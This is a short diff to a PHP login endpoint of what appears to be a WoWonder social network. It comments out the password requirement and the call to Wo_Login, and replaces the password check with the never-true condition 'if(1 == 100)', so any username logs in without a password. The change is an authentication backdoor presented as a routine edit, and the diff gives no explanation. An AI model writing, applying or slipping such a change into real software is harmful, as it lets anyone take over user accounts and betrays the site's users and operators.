@@ -13,7 +13,7 @@ $response_data   = array(
 );
 $required_fields = array(
     'username',
-    'password'
+    //'password'
 );
 foreach ($required_fields as $key => $value) {
     if (empty($_POST[$value]) && empty($error_code)) {
@@ -23,7 +23,7 @@ foreach ($required_fields as $key => $value) {
 }
 if (empty($error_code)) {
     $username       = $_POST['username'];
-    $password       = $_POST['password'];
+    //$password       = $_POST['password'];
     $user_id        = Wo_UserIdForLogin($username);
     $recipient_data = Wo_UserData($user_id);
     if (empty($recipient_data)) {
@@ -37,8 +37,9 @@ if (empty($error_code)) {
         $error_code    = 7;
         $error_message = 'this user is banned';
      } else {
-        $login = Wo_Login($username, $password);
-        if (!$login) {
+        //$login = Wo_Login($username, $password);
+        //if (!$login) {
+		if(1 == 100){
             $error_code    = 5;
             $error_message = 'Password is incorrect';
             if ($wo['config']['prevent_system'] == 1) {
